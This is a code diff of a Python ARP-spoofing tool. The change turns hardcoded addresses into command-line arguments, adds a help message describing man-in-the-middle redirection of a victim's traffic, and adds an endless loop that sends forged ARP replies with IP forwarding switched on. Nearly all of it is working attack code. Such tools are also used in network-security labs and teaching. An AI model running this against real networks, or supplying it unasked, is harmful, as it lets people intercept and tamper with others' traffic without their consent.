@@ -1,44 +1,48 @@
 import socket
 import struct
 import sys
+import time
+import threading
 
 FILE_ip_forward = "/proc/sys/net/ipv4/ip_forward"
 
 args = sys.argv
 
-if '-attackerIP' in args :
-    attackerIP =  args[args.index('-attackerIP') + 1]
-
-if '-attackerMAC' in args :
-    attackerMAC = bytes(args[args.index('-attackerMAC') + 1],'utf-8')
-
-if '-targetIP' in args :
-    targetIP = args[args.index('-targetIP') + 1]
-
-if '-targetMAC' in args :
-    targetMAC = bytes(args[args.index('-targetMAC') + 1],'utf-8')
-
 def main():
+    if '-sourceIP' not in args or '-sourceMAC' not in args or '-dstIP' not in args or '-dstMAC' not in args:
+        printhelp()
+        sys.exit()
+        
     checkIPForwarding()
 
-    # Example usage:
-    '''
-    gateway_ip = ''
-    src_mac = b'\x00\x00\x00\x00\x00\x01' # Replace with your own source MAC address
-    src_ip = '192.168.1.1' # Replace with your own source IP address
-    dst_mac = b'\xff\xff\xff\xff\xff\xff' # Broadcast MAC address
-    dst_ip = '192.168.1.100' # Replace with the destination IP address you want to send the ARP response to
-    '''
-    attackerIP = socket.inet_aton("192.168.1.1")
-    attackerMAC = struct.pack("!6s", b'\x00\x0c\x29\x6f\xd6\xee')
-    targetIP = socket.inet_aton("192.168.1.100")
-    targetMAC = struct.pack("!6s", b'\xff\xff\xff\xff\xff\xff')
+    sourceIP =  args[args.index('-sourceIP') + 1]
+    print("[+] Spoofed IP: " + sourceIP)
+    
+    sourceMAC = args[args.index('-sourceMAC') + 1]
+    print("[+] Attacker MAC: " + sourceMAC)
+    sourceMAC = bytes.fromhex(sourceMAC.replace(":", ""))
+    sourceMAC = struct.pack("!6s", sourceMAC)
+    
+    dstIP = args[args.index('-dstIP') + 1]
+    print("[+] Destination IP: " + dstIP)
+    
+    dstMAC= args[args.index('-dstMAC') + 1]
+    print("[+] Destination MAC: " + dstMAC)
+    dstMAC = bytes.fromhex(dstMAC.replace(":", ""))
+    dstMAC = struct.pack("!6s", dstMAC)
+    
+    while True:
+        send_arp_response(sourceMAC, sourceIP, dstMAC, dstIP)
 
-    print(attackerIP)
-    print(attackerMAC)
-    print(targetIP)
-    print(targetMAC)
-    send_arp_response(attackerMAC, attackerIP, targetMAC, targetIP)
+def printhelp():
+    print("usage: ARPspoof.py -sourceIP [IPADDRESS] -sourceMAC [MACADDRESS] -dstIP [IPADDRESS] -dstMAC [MACADDRESS]")
+    print("  -sourceIP			spoofed IP of the target (web app, router, ...)")
+    print("  -sourceMAC			attacker MAC where to redirect trafic")
+    print("  -dstIP			IP address of destination")
+    print("  -dstMAC			the MAC of targeted device that you want to Mitm")
+    print("")
+    print("[EXAMPLE] > python3 ARPspoof.py -sourceIP 192.168.1.9 -sourceMAC 00:11:22:33:44:55 -dstIP 192.168.1.1 -dstMAC 00:11:22:33:44:66")
+
 
 def checkIPForwarding():
     print('[?] Checking if IP forwarding is enabled in "' + FILE_ip_forward + '" ...')
@@ -46,6 +50,7 @@ def checkIPForwarding():
         f_content = f.read()
         if int(f_content) == 1 :
             print('[+] IP forwarding is enabled')
+            print('----------------------------------------------------------------------')
             f.close()
         else:
             f.close()
@@ -53,6 +58,8 @@ def checkIPForwarding():
             answer = input('[?] Do you want to activate IP forwarding ? y/N > ')
             if answer == 'y' or answer == 'Y' :
                 enableIPForwading()
+                print('[+] IP forwarding is now enabled')
+                print('----------------------------------------------------------------------')
             else :
                 print('[!] IP forwarding must be enabled to prevent damaging the network. Exiting...')
                 sys.exit()
@@ -140,29 +147,24 @@ def send_arp_response(src_mac, src_ip, dst_mac, dst_ip):
                              dst_mac,        # Target MAC address
                              dst_ip)         # Target IP address
     '''
-
-    #attckrmac = b'\x00\x0c\x29\x4f\x8e\x76'
-    attckrmac = b'\x08\x00\x27\x43\x73\xbc'
-    #victimmac =b'\x00\x0C\x29\x2E\x84\x5A'
-    victimmac = b'\x94\x65\x9C\x22\xD3\xC8'
+    
     code =b'\x08\x06'
     htype = b'\x00\x01'
     protype = b'\x08\x00'
     hsize = b'\x06'
     psize = b'\x04'
     opcode = b'\x00\x02'
-    to_usurp_ip = '192.168.2.1'
-    to_usurp_ip = socket.inet_aton ( to_usurp_ip )
-    print(type(to_usurp_ip))
-    victim_ip = '192.168.2.76'
-    victim_ip = socket.inet_aton ( victim_ip )
-    print(type(victim_ip))
+    
+    src_ip = socket.inet_aton ( src_ip )
+    dst_ip = socket.inet_aton ( dst_ip )
+    
     padding = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
 
-    ARP_FRAME = victimmac + attckrmac + code + htype + protype + hsize + psize + opcode + attckrmac + to_usurp_ip + victimmac + victim_ip + padding
-
-    # Send the ARP frame
+    ARP_FRAME = dst_mac + src_mac + code + htype + protype + hsize + psize + opcode + src_mac + src_ip + dst_mac + dst_ip + padding
+    
+    print("[+] Sending spoofed ARP frame!")
     s.send(ARP_FRAME)
+    time.sleep(1)
 
 
 
